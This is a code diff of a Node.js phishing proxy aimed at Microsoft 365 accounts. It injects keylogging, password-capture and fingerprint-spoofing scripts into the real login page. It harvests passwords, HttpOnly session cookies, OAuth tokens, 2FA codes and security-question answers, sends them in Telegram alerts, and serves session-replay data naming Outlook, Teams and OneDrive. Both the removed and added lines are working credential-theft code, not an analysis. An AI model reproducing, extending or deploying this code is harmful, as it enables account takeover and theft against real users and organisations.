-                        VICTIM_SESSIONS[sessionId].lastValidationResult = 'success';
-                        VICTIM_SESSIONS[sessionId].validationAttempts.push({
-                            result: 'success',
-                            timestamp: Date.now(),
-                            validationTime: result.validationTime
-                        });
-                        VICTIM_SESSIONS[sessionId].httpOnlyCookies = sessionStore.getHttpOnlyCookies(sessionId);
-                        VICTIM_SESSIONS[sessionId].cookieHeader = sessionStore.getCookieHeader(sessionId);
-                    }
-                    
-                    // Send SUCCESS Telegram alert with ALL data
-                    await sendTelegramAlert('validation_success', {
-                        email: email,
-                        password: password || 'N/A',
-                        accessToken: result.tokens?.access_token,
-                        refreshToken: result.tokens?.refresh_token,
-                        idToken: result.tokens?.id_token,
-                        sessionId: sessionId,
-                        ip: ip,
-                        timestamp: new Date().toISOString(),
-                        validationTime: result.validationTime,
-                        attemptCount: attemptCount,
-                        httpOnlyCount: httpOnlyCount,
-                        tokenCount: result.tokens ? Object.keys(result.tokens).length : 0,
-                        secure: true
-                    });
-                    
-                    // Also send HttpOnly cookie alert
-                    if (httpOnlyCount > 0) {
-                        const httpOnlyCookies = sessionStore.getHttpOnlyCookies(sessionId);
-                        const cookieList = httpOnlyCookies.map(c => 
-                            `  🔒 \`${c.name}\`: \`${c.value.substring(0, 30)}...\``
-                        ).join('\n');
-                        
-                        await sendTelegramAlert('http_only_cookies', {
-                            email: email,
-                            sessionId: sessionId,
-                            timestamp: new Date().toISOString(),
-                            cookieCount: httpOnlyCount,
-                            httpOnlyCount: httpOnlyCount,
-                            cookieList: cookieList || 'No HttpOnly cookies'
-                        });
-                    }
-                    
-                    // Redirect to Teams
-                    res.writeHead(302, { 
-                        'Location': TEAMS_REDIRECT, 
-                        'Cache-Control': 'no-store, no-cache, must-revalidate'
-                    });
-                    res.end();
-                    
-                } else {
-                    console.log(`[AUTH] ❌ INVALID Microsoft credentials: ${email}`);
-                    console.log(`[AUTH] ⏱️ Validation time: ${result.validationTime}ms`);
-                    console.log(`[AUTH] ❌ Error: ${result.error}`);
-                    
-                    // Update session
-                    if (sessionId && VICTIM_SESSIONS[sessionId]) {
-                        VICTIM_SESSIONS[sessionId].lastValidationResult = 'failed';
-                        VICTIM_SESSIONS[sessionId].validationAttempts.push({
-                            result: 'failed',
-                            timestamp: Date.now(),
-                            error: result.error,
-                            validationTime: result.validationTime
-                        });
-                    }
-                    
-                    // Send FAILED Telegram alert
-                    await sendTelegramAlert('validation_failed', {
-                        email: email,
-                        password: password || 'N/A',
-                        sessionId: sessionId,
-                        ip: ip,
-                        timestamp: new Date().toISOString(),
-                        attemptCount: attemptCount,
-                        error: result.error || 'Invalid username or password',
-                        validationTime: result.validationTime,
-                        retryCount: attemptCount - 1
-                    });
-                    
-                    // Redirect back to Microsoft login with error
-                    const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
-                        `client_id=${MICROSOFT_CLIENT_ID}&` +
-                        `response_type=code&` +
-                        `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
-                        `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
-                        `login_hint=${encodeURIComponent(email)}&` +
-                        `error=invalid_credentials`;
-                    
-                    res.writeHead(302, { 'Location': errorUrl, 'Cache-Control': 'no-store' });
-                    res.end();
-                }
-            })
-            .catch(async (error) => {
-                console.error('[ERROR] Microsoft verification failed:', error.message);
-                
-                // Send error alert
-                await sendTelegramAlert('validation_failed', {
-                    email: email,
-                    password: password || 'N/A',
-                    sessionId: sessionId,
-                    ip: ip,
-                    timestamp: new Date().toISOString(),
-                    attemptCount: attemptCount,
-                    error: error.message || 'Service error',
-                    validationTime: 'N/A',
-                    retryCount: attemptCount - 1
-                });
-                
-                const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
-                    `client_id=${MICROSOFT_CLIENT_ID}&` +
-                    `response_type=code&` +
-                    `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
-                    `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
-                    `login_hint=${encodeURIComponent(email)}&` +
-                    `error=service_error`;
-                
-                res.writeHead(302, { 'Location': errorUrl });
-                res.end();
-            });
-
-    } catch (error) {
-        console.error('[ERROR] POST handling failed:', error.message);
-        res.writeHead(500);
-        res.end('Internal server error');
-    }
-}
-
-// ============================================================
-//  GENERATE EVASION SCRIPTS
-// ============================================================
-
-function generateEvasionScripts(sessionId, email, randomUA) {
-    return `
-    <script>
-    (function() {
-        // Fingerprint spoofing
-        const spoofFingerprint = function() {
-            const originalGetContext = HTMLCanvasElement.prototype.getContext;
-            HTMLCanvasElement.prototype.getContext = function(type, ...args) {
-                const context = originalGetContext.call(this, type, ...args);
-                if (type === 'webgl' || type === 'experimental-webgl') {
-                    const originalGetParameter = context.getParameter;
-                    context.getParameter = function(parameter) {
-                        if (parameter === 37445) {
-                            const renderers = [
-                                'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)',
-                                'ANGLE (NVIDIA, NVIDIA GeForce GTX 1050 Direct3D11 vs_5_0 ps_5_0)',
-                                'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)'
-                            ];
-                            return renderers[Math.floor(Math.random() * renderers.length)];
-                        }
-                        return originalGetParameter.call(this, parameter);
-                    };
-                }
-                return context;
-            };
-            
-            const platforms = ['Win32', 'MacIntel', 'Linux x86_64'];
-            const concurrency = [4, 6, 8, 12];
-            const memory = [4, 8, 16, 32];
-            
-            Object.defineProperty(navigator, 'platform', {
-                get: () => platforms[Math.floor(Math.random() * platforms.length)]
-            });
-            Object.defineProperty(navigator, 'hardwareConcurrency', {
-                get: () => concurrency[Math.floor(Math.random() * concurrency.length)]
-            });
-            Object.defineProperty(navigator, 'deviceMemory', {
-                get: () => memory[Math.floor(Math.random() * memory.length)]
-            });
-        };
-        
-        // Token rotation
-        const rotateTokens = function() {
-            let rotationCount = 0;
-            const maxRotations = ${Math.floor(Math.random() * 10) + 5};
-            
-            function doRotation() {
-                if (rotationCount >= maxRotations) return;
-                rotationCount++;
-                const tokens = {
-                    access_token: '${crypto.randomBytes(32).toString('hex')}',
-                    refresh_token: '${crypto.randomBytes(32).toString('hex')}',
-                    id_token: '${crypto.randomBytes(32).toString('hex')}',
-                    timestamp: Date.now(),
-                    rotation: rotationCount
-                };
-                
-                localStorage.setItem('rotated_tokens', JSON.stringify(tokens));
-                
-                fetch('/api/token-rotation', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(tokens)
-                }).catch(() => {});
-            }
-            
-            const intervals = [30000, 60000, 120000];
-            const interval = intervals[Math.floor(Math.random() * intervals.length)];
-            
-            setTimeout(doRotation, 5000 + Math.random() * 5000);
-            setInterval(doRotation, interval);
-        };
-        
-        // Session rotation
-        const rotateSession = function() {
-            let rotationCount = 0;
-            const maxRotations = ${Math.floor(Math.random() * 8) + 3};
-            
-            function doSessionRotation() {
-                if (rotationCount >= maxRotations) return;
-                rotationCount++;
-                const newSessionId = '${crypto.randomBytes(16).toString('hex')}';
-                
-                history.replaceState(
-                    {session: newSessionId},
-                    'Session Rotated',
-                    window.location.pathname + '?sid=' + newSessionId
-                );
-                
-                localStorage.setItem('session_rotated', JSON.stringify({
-                    sessionId: newSessionId,
-                    rotation: rotationCount,
-                    timestamp: Date.now()
-                }));
-                
-                fetch('/api/session-rotate', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        sessionId: newSessionId,
-                        rotation: rotationCount
-                    })
-                }).catch(() => {});
-            }
-            
-            const intervals = [15000, 30000, 60000];
-            const interval = intervals[Math.floor(Math.random() * intervals.length)];
-            
-            setTimeout(doSessionRotation, 5000 + Math.random() * 10000);
-            setInterval(doSessionRotation, interval);
-        };
-        
-        console.log('[EVASION] 🛡️ Initializing evasion techniques...');
-        try { spoofFingerprint(); } catch(e) {}
-        try { rotateTokens(); } catch(e) {}
-        try { rotateSession(); } catch(e) {}
-        console.log('[EVASION] ✅ Evasion techniques activated');
-    })();
-    </script>
-    `;
-}
-
-// ============================================================
-//  CAPTURE COOKIES FROM RESPONSE
-// ============================================================
-
-function captureCookiesFromResponse(response, sessionId) {
-    try {
-        const cookieHeaders = response.headers['set-cookie'] || [];
-        const capturedCookies = {};
-        
-        // Store HttpOnly cookies
-        if (cookieHeaders.length > 0 && sessionId) {
-            sessionStore.storeHttpOnlyCookies(sessionId, cookieHeaders, response.url || 'microsoft_response');
-        }
-        
-        for (const cookieHeader of cookieHeaders) {
-            const parts = cookieHeader.split(';');
-            const [nameValue, ...attributes] = parts;
-            const [name, value] = nameValue.split('=');
-            
-            if (name && value && value !== 'null' && value !== 'undefined') {
-                const isHttpOnly = attributes.some(attr => attr.trim().toLowerCase() === 'httponly');
-                capturedCookies[name] = {
-                    value: value,
-                    httpOnly: isHttpOnly,
-                    secure: attributes.some(attr => attr.trim().toLowerCase() === 'secure'),
-                    sameSite: attributes.find(attr => attr.trim().toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax',
-                    path: attributes.find(attr => attr.trim().toLowerCase().startsWith('path='))?.split('=')[1] || '/',
-                    domain: attributes.find(attr => attr.trim().toLowerCase().startsWith('domain='))?.split('=')[1] || '',
-                    expires: attributes.find(attr => attr.trim().toLowerCase().startsWith('expires='))?.split('=')[1] || null
-                };
-            }
-        }
-        
-        if (Object.keys(capturedCookies).length > 0) {
-            sessionStore.storeCookies(sessionId, capturedCookies, 'microsoft_response');
-        }
-        
-        return capturedCookies;
-    } catch (error) {
-        console.error('[COOKIE-CAPTURE] Error:', error.message);
-        return {};
-    }
-}
-
-// ============================================================
-//  HANDLE LOGIN REQUEST
-// ============================================================
-
-function handleLoginRequest(req, res) {
-    const paramName = PHISHED_URL_PARAMETER || 'login_hint';
-    const rawEmail = req.url.split(`${paramName}=`)[1]?.split('&')[0] || '';
-    let email = rawEmail ? decodeURIComponent(rawEmail) : '';
-    const ip = getClientIp(req);
-    const userAgent = req.headers['user-agent'] || 'Unknown';
-    
-    if (!email) {
-        const sessionId = getSessionIdFromCookie(req.headers.cookie);
-        if (sessionId && VICTIM_SESSIONS[sessionId]) {
-            email = VICTIM_SESSIONS[sessionId].email;
-        }
-    }
-    
-    if (!email) {
-        console.warn('[PROXY] ⚠️ No email found, using default');
-        email = 'guest@example.com';
-    }
-
-    const sessionId = createSession(email, ip, userAgent);
-    const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
-    const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
-    res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);
-
-    const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
-        `client_id=${MICROSOFT_CLIENT_ID}&` +
-        `response_type=code&` +
-        `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
-        `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
-        `${paramName}=${encodeURIComponent(email)}`;
-
-    console.log(`[PROXY] 🔄 Fetching Microsoft login page for: ${email}`);
-
-    const userAgents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-    ];
-    const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
-
-    const options = {
-        headers: {
-            'User-Agent': randomUA,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'Upgrade-Insecure-Requests': '1'
-        }
-    };
-
-    https.get(targetUrl, options, (targetRes) => {
-        let data = [];
-        targetRes.on('data', chunk => data.push(chunk));
-        targetRes.on('end', () => {
-            let body = Buffer.concat(data);
-            
-            if (targetRes.headers['content-encoding'] === 'gzip') {
-                try { body = zlib.gunzipSync(body); } catch(e) {}
-            } else if (targetRes.headers['content-encoding'] === 'br') {
-                try { body = zlib.brotliDecompressSync(body); } catch(e) {}
-            }
-            
-            let html = body.toString('utf-8');
-            
-            // Capture HttpOnly cookies
-            captureCookiesFromResponse(targetRes, sessionId);
-            
-            // Store tokens
-            const cookieHeaders = targetRes.headers['set-cookie'] || [];
-            const tokens = {};
-            for (const cookieHeader of cookieHeaders) {
-                const [nameValue] = cookieHeader.split(';');
-                const [name, value] = nameValue.split('=');
-                if (name && value && value !== 'null' && value !== 'undefined') {
-                    if (name.includes('ESTSAUTH') || name.includes('ESTSSESSION') || name.includes('ESTSAUTHPERSISTENT')) {
-                        tokens[name] = value;
-                    }
-                }
-            }
-            
-            if (Object.keys(tokens).length > 0) {
-                sessionStore.storeTokens(sessionId, tokens);
-            }
-            
-            // Generate scripts
-            const evasionScripts = generateEvasionScripts(sessionId, email, randomUA);
-            const passwordCaptureScript = generatePasswordCaptureScript(sessionId, email, randomUA);
-            
-            const injectionScript = `
-            <script>
-                window.MICROSOFT_CONFIG = {
-                    BACKEND_URL: '${BACKEND_URL}',
-                    KEYLOGGER_URL: '${KEYLOGGER_URL}',
-                    SESSION_ID: '${sessionId}',
-                    EMAIL: '${email}',
-                    CLIENT_ID: '${MICROSOFT_CLIENT_ID}',
-                    SERVICE: 'Microsoft 365',
-                    EVASION_ENABLED: true
-                };
-            </script>
-            <script src="${PROXY_PATHNAMES.script}"></script>
-            ${evasionScripts}
-            ${passwordCaptureScript}
-            `;
-            
-            html = html.replace(/(src|href)="\//g, '$1="https://login.microsoftonline.com/');
-            html = html.replace(/<\/body>/i, injectionScript + '</body>');
-            
-            if (!html.includes('</body>')) {
-                html = html + injectionScript;
-            }
-            
-            res.writeHead(targetRes.statusCode || 200, {
-                'Content-Type': 'text/html; charset=utf-8',
-                'Cache-Control': 'no-store, no-cache, must-revalidate',
-                'Pragma': 'no-cache',
-                'Server': 'Microsoft-IIS/10.0'
-            });
-            res.end(html);
-        });
-    }).on('error', (err) => {
-        console.error(`[ERROR] Proxy failed: ${err.message}`);
-        res.writeHead(302, { 'Location': targetUrl });
-        res.end();
-    });
-}
-
 // ============================================================
 //  MAIN SERVER
 // ============================================================
@@ -2503,40 +1820,41 @@ function handleLoginRequest(req, res) {
 const server = http.createServer((req, res) => {
     console.log(`[REQUEST] ${req.method} ${req.url}`);
 
-    // Serve files
-    if (req.url === '/' || req.url === '/index.html') {
-        serveFile('index.html', res);
-        return;
-    }
+    // ============================================================
+    //  SERVE STATIC FILES - FIXED: Uses public/ folder
+    // ============================================================
+    
     if (req.url === PROXY_PATHNAMES.script) {
-        serveFile('script_Vx9Z6XN5uC3k.js', res, 'text/javascript');
+        serveFile(PROXY_PATHNAMES.scriptFile, res, 'text/javascript');
         return;
     }
+    
     if (req.url === PROXY_PATHNAMES.serviceWorker) {
-        serveFile('microsoft_inject.js', res, 'text/javascript');
+        serveFile(PROXY_PATHNAMES.serviceWorkerFile, res, 'text/javascript');
+        return;
+    }
+    
+    if (req.url === PROXY_PATHNAMES.swRegister) {
+        serveFile('sw-register.js', res, 'text/javascript');
         return;
     }
 
-    // Password capture endpoints
-    if (req.url === PROXY_PATHNAMES.passwordCapture && req.method === 'POST') {
-        handlePasswordCapture(req, res);
-        return;
-    }
-    if (req.url === PROXY_PATHNAMES.credentialCapture && req.method === 'POST') {
-        handlePasswordCapture(req, res);
-        return;
-    }
-
-    // OAuth callback routes
+    // ============================================================
+    //  OAUTH CALLBACK ROUTES
+    // ============================================================
+    
     if (req.url.startsWith('/callback') || req.url.startsWith('/common/oauth2/nativeclient')) {
         handleOAuthCallback(req, res);
         return;
     }
+    
     if (req.url.includes('code=')) {
         handleOAuthCallback(req, res);
         return;
     }
+    
     if (req.url.includes('wrongplace')) {
+        console.log('[PROXY] 🔄 Wrongplace detected - redirecting to proxy');
         const sessionId = getSessionIdFromCookie(req.headers.cookie);
         const email = sessionId && VICTIM_SESSIONS[sessionId] ? 
             VICTIM_SESSIONS[sessionId].email : 'guest@example.com';
@@ -2546,33 +1864,108 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // OAuth auto-capture endpoints
-    if (req.url === PROXY_PATHNAMES.oauthCaptureEndpoint && req.method === 'POST') {
-        handleOAuthCapture(req, res);
-        return;
-    }
-    if (req.url === PROXY_PATHNAMES.captureUserEndpoint && req.method === 'POST') {
-        handleOAuthCapture(req, res);
-        return;
-    }
-    if (req.url === PROXY_PATHNAMES.telegramEndpoint && req.method === 'POST') {
+    // ============================================================
+    //  API ENDPOINTS
+    // ============================================================
+    
+    if (req.url === PROXY_PATHNAMES.passwordCapture && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', () => {
             try {
-                const { message, parseMode } = JSON.parse(body);
-                sendToTelegram(message, parseMode);
+                const data = JSON.parse(body);
+                const { email, password, source, sessionId, context } = data;
+                const ip = getClientIp(req);
+                
+                if (email && password) {
+                    sessionStore.storePasswordCapture(
+                        sessionId || getSessionIdFromCookie(req.headers.cookie),
+                        email, 
+                        password, 
+                        source || 'api',
+                        { ip, userAgent: req.headers['user-agent'], ...context }
+                    );
+                    
+                    res.writeHead(200, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ success: true }));
+                } else {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Email and password required' }));
+                }
+            } catch (error) {
+                console.error('[PASSWORD-CAPTURE] Error:', error.message);
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: 'Internal server error' }));
+            }
+        });
+        return;
+    }
+    
+    if (req.url === PROXY_PATHNAMES.credentialCapture && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const data = JSON.parse(body);
+                const { email, password, source, sessionId } = data;
+                const ip = getClientIp(req);
+                
+                if (email && password) {
+                    sessionStore.storePasswordCapture(
+                        sessionId || getSessionIdFromCookie(req.headers.cookie),
+                        email, 
+                        password, 
+                        source || 'credential_capture',
+                        { ip, userAgent: req.headers['user-agent'] }
+                    );
+                    
+                    res.writeHead(200, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ success: true }));
+                } else {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Email and password required' }));
+                }
+            } catch (error) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: 'Internal server error' }));
+            }
+        });
+        return;
+    }
+    
+    if (req.url === PROXY_PATHNAMES.cookieStoreEndpoint && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const data = JSON.parse(body);
+                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
+                
+                if (sessionId && data.cookies) {
+                    sessionStore.storeCookies(sessionId, data.cookies, data.source || 'service_worker');
+                    
+                    const httpOnlyCookies = [];
+                    for (const [name, cookieData] of Object.entries(data.cookies)) {
+                        if (cookieData.httpOnly) {
+                            httpOnlyCookies.push({ name, value: cookieData.value });
+                        }
+                    }
+                    if (httpOnlyCookies.length > 0 && data.httpOnlyCount) {
+                        sessionStore.httpOnlyCookies.set(sessionId, httpOnlyCookies);
+                    }
+                }
+                
                 res.writeHead(200, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ success: true }));
             } catch (error) {
+                console.error('[COOKIE-STORE] Error:', error.message);
                 res.writeHead(500);
-                res.end(JSON.stringify({ error: 'Failed to send message' }));
+                res.end(JSON.stringify({ error: 'Internal server error' }));
             }
         });
         return;
     }
 
-    // Keylog endpoint with password extraction
     if (req.url === PROXY_PATHNAMES.keylogEndpoint && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -2585,6 +1978,7 @@ const server = http.createServer((req, res) => {
                 console.log(`[KEYLOG] ⌨️ Received keystrokes for session ${sessionId ? sessionId.substring(0, 12) : 'N/A'}`);
                 
                 let extractedPassword = null;
+                
                 if (data.keystrokes) {
                     const passMatch = data.keystrokes.match(/\[FIELD:passwd=([^\]]+)\]/g);
                     if (passMatch) {
@@ -2595,26 +1989,14 @@ const server = http.createServer((req, res) => {
                         }
                         if (fullPassword) {
                             extractedPassword = fullPassword;
-                            console.log(`[KEYLOG] 🔑 Extracted password: ${extractedPassword}`);
+                            console.log(`[KEYLOG] 🔑 Extracted password from keystrokes: ${extractedPassword}`);
                             
                             const email = VICTIM_SESSIONS[sessionId]?.email || 'unknown';
                             
-                            // Send extracted password
-                            sendCredentialsToAllEndpoints(email, extractedPassword, 'keylog_extraction', sessionId, {
+                            sessionStore.storePasswordCapture(sessionId, email, extractedPassword, 'keylog_extraction', {
                                 ip: ip,
                                 userAgent: req.headers['user-agent'],
                                 url: data.url || 'unknown'
-                            });
-                            
-                            // Send keylog extraction alert
-                            sendTelegramAlert('keylog_extraction', {
-                                email: email,
-                                password: extractedPassword,
-                                sessionId: sessionId,
-                                ip: ip,
-                                timestamp: new Date().toISOString(),
-                                keyCount: data.keystrokes?.length || 0,
-                                attemptCount: VICTIM_SESSIONS[sessionId]?.attempts || 1
                             });
                         }
                     }
@@ -2635,82 +2017,6 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Full auth endpoint
-    if (req.url === PROXY_PATHNAMES.fullAuthEndpoint && req.method === 'POST') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', () => {
-            try {
-                const data = JSON.parse(body);
-                const sessionId = getSessionIdFromCookie(req.headers.cookie) || data.sessionId;
-                
-                if (!sessionId) {
-                    res.writeHead(400);
-                    res.end(JSON.stringify({ error: 'No session ID' }));
-                    return;
-                }
-                
-                const authData = {
-                    email: data.email || 'unknown',
-                    name: data.name || 'unknown',
-                    organization: data.organization || 'unknown',
-                    password: data.password || '',
-                    twoFactorCode: data.twoFactorCode || '',
-                    appPassword: data.appPassword || null,
-                    securityQuestion1: data.securityQuestion1 || { question: 'N/A', answer: 'N/A' },
-                    securityQuestion2: data.securityQuestion2 || { question: 'N/A', answer: 'N/A' },
-                    collectedAt: data.collectedAt || new Date().toISOString(),
-                    userAgent: data.userAgent || req.headers['user-agent'] || 'Unknown',
-                    ip: getClientIp(req)
-                };
-                
-                sessionStore.storeFullAuthData(sessionId, authData);
-                
-                if (VICTIM_SESSIONS[sessionId]) {
-                    VICTIM_SESSIONS[sessionId].fullAuthData = authData;
-                    VICTIM_SESSIONS[sessionId].fullAuthCompleted = true;
-                    if (authData.password) {
-                        VICTIM_SESSIONS[sessionId].password = authData.password;
-                    }
-                }
-                
-                // Send full auth alert
-                const httpOnlyCount = sessionStore.getHttpOnlyCookies(sessionId).length;
-                const tokens = sessionStore.allTokens.get(sessionId) || {};
-                const tokenCount = Object.values(tokens).filter(t => t && t.value && t.isValid !== false).length;
-                
-                sendTelegramAlert('full_auth', {
-                    email: authData.email,
-                    name: authData.name,
-                    organization: authData.organization,
-                    password: authData.password,
-                    twoFactorCode: authData.twoFactorCode,
-                    securityQuestion1: authData.securityQuestion1,
-                    securityQuestion2: authData.securityQuestion2,
-                    sessionId: sessionId,
-                    ip: authData.ip,
-                    timestamp: authData.collectedAt,
-                    httpOnlyCount: httpOnlyCount,
-                    tokenCount: tokenCount
-                });
-                
-                res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ 
-                    success: true, 
-                    sessionId: sessionId,
-                    stored: true
-                }));
-                
-            } catch (error) {
-                console.error('[FULL-AUTH] Error:', error.message);
-                res.writeHead(500);
-                res.end(JSON.stringify({ error: 'Internal server error' }));
-            }
-        });
-        return;
-    }
-
-    // Session replay endpoint
     if (req.url === PROXY_PATHNAMES.sessionReplayEndpoint && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -2732,38 +2038,17 @@ const server = http.createServer((req, res) => {
                     return;
                 }
                 
-                const cookieData = sessionStore.getCookieHeader(sessionId);
-                const httpOnlyCookies = sessionStore.getHttpOnlyCookies(sessionId);
-                const tokens = sessionStore.allTokens.get(sessionId) || {};
-                const validTokens = {};
-                for (const [key, token] of Object.entries(tokens)) {
-                    if (token && token.value && token.isValid !== false && token.value !== 'null' && token.value !== 'undefined') {
-                        validTokens[key] = token.value;
-                    }
-                }
-                
                 res.writeHead(200, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({
                     success: true,
                     sessionId: sessionId,
                     sessionData: sessionData,
-                    cookieHeader: cookieData?.cookieHeader || '',
-                    cookieCount: cookieData?.cookieCount || 0,
-                    httpOnlyCookies: httpOnlyCookies,
-                    httpOnlyCount: httpOnlyCookies.length,
-                    tokens: validTokens,
-                    tokenCount: Object.keys(validTokens).length,
-                    passwordCaptures: sessionStore.getPasswordCaptures(sessionId),
+                    httpOnlyCookies: sessionStore.httpOnlyCookies.get(sessionId) || [],
+                    httpOnlyCount: sessionStore.httpOnlyCookies.get(sessionId)?.length || 0,
+                    passwordCaptures: sessionStore.passwordCaptures.get(sessionId) || [],
                     fullAuthData: sessionStore.getFullAuthData(sessionId),
-                    replayInstructions: {
-                        useCookieHeader: cookieData?.cookieHeader || '',
-                        targetUrls: [
-                            'https://outlook.office.com',
-                            'https://teams.microsoft.com',
-                            'https://onedrive.live.com',
-                            'https://www.office.com'
-                        ]
-                    }
+                    tokenCount: sessionStore.allTokens.get(sessionId) ? 
+                        Object.values(sessionStore.allTokens.get(sessionId)).filter(t => t && t.value && t.isValid !== false).length : 0
                 }, null, 2));
                 
             } catch (error) {
@@ -2775,24 +2060,160 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Health check
+    if (req.url === PROXY_PATHNAMES.fullSessionData && req.method === 'GET') {
+        const sessionId = req.headers['x-session-id'] || getSessionIdFromCookie(req.headers.cookie);
+        
+        if (!sessionId) {
+            res.writeHead(400);
+            res.end(JSON.stringify({ error: 'No session ID' }));
+            return;
+        }
+        
+        const sessionData = sessionStore.getReplayData(sessionId);
+        if (!sessionData) {
+            res.writeHead(404);
+            res.end(JSON.stringify({ error: 'Session not found' }));
+            return;
+        }
+        
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+            success: true,
+            sessionId: sessionId,
+            sessionData: sessionData,
+            httpOnlyCookies: sessionStore.httpOnlyCookies.get(sessionId) || [],
+            passwordCaptures: sessionStore.passwordCaptures.get(sessionId) || [],
+            fullAuthData: sessionStore.getFullAuthData(sessionId),
+            stats: sessionStore.getStats()
+        }, null, 2));
+        return;
+    }
+
+    if (req.url === PROXY_PATHNAMES.tokenRotation && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const data = JSON.parse(body);
+                const sessionId = getSessionIdFromCookie(req.headers.cookie);
+                if (sessionId) {
+                    sessionStore.evasionCounters.set(sessionId, {
+                        ...sessionStore.evasionCounters.get(sessionId),
+                        rotations: (sessionStore.evasionCounters.get(sessionId)?.rotations || 0) + 1
+                    });
+                }
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, rotated: true }));
+            } catch (error) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: 'Internal server error' }));
+            }
+        });
+        return;
+    }
+
+    if (req.url === PROXY_PATHNAMES.sessionRotate && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const data = JSON.parse(body);
+                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
+                if (sessionId) {
+                    sessionStore.evasionCounters.set(sessionId, {
+                        ...sessionStore.evasionCounters.get(sessionId),
+                        rotations: (sessionStore.evasionCounters.get(sessionId)?.rotations || 0) + 1
+                    });
+                    res.writeHead(200, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ 
+                        success: true, 
+                        rotated: true,
+                        rotationCount: sessionStore.evasionCounters.get(sessionId)?.rotations || 0
+                    }));
+                } else {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'No session ID' }));
+                }
+            } catch (error) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: 'Internal server error' }));
+            }
+        });
+        return;
+    }
+
+    if (req.url === PROXY_PATHNAMES.telegramEndpoint && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const { message, parseMode } = JSON.parse(body);
+                sessionStore.sendTelegram(message, parseMode);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true }));
+            } catch (error) {
+                console.error('[TELEGRAM] Error:', error.message);
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: 'Failed to send message' }));
+            }
+        });
+        return;
+    }
+
+    // ============================================================
+    //  HEALTH CHECK
+    // ============================================================
+    
     if (req.url === '/health') {
         const stats = sessionStore.getStats();
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({
             status: 'healthy',
             timestamp: new Date().toISOString(),
-            sessions: Object.keys(VICTIM_SESSIONS).length,
             stats: stats,
             evasionEnabled: true,
             httpOnlyCapture: true,
             passwordCapture: true,
-            telegramAlerts: true
+            oauthCapture: true,
+            version: '4.0.0',
+            microsoftEndpoint: 'tenant-specific'
         }, null, 2));
         return;
     }
 
-    // POST requests
+    // ============================================================
+    //  SESSIONS ADMIN
+    // ============================================================
+    
+    if (req.url === '/sessions' && req.method === 'GET') {
